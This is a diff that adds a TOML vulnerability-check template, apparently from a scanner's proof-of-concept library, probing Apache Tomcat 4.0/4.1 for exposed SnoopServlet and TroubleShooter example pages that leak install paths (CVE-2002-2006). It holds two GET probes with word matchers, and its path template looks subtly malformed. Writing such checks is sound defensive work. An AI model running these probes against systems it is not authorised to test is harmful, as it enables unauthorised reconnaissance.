@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "验证目标 Apache Tomcat 服务器是否存在默认示例 servlet（SnoopServlet 或 TroubleShooter）未授权访问导致的路径信息泄露漏洞。通过发送 HTTP GET 请求访问 /examples/servlet/SnoopServlet，检测响应中是否包含 Tomcat 安装路径及敏感系统信息。"
+id = "POC-AVE-2002-0743"
+name = "Apache Tomcat 4.0/4.1 Servlet 路径信息泄露 PoC"
+severity = "medium"
+tags = ["ave-2002-0743"]
+vuln_id = [
+    "CVE-2002-2006",
+    "AVE-2002-0743",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/servlet/SnoopServlet"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "SnoopServlet",
+    "Tomcat",
+    "Servlet path",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/servlet/TroubleShooter"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "TroubleShooter",
+    "Tomcat",
+    "Servlet path",
+]
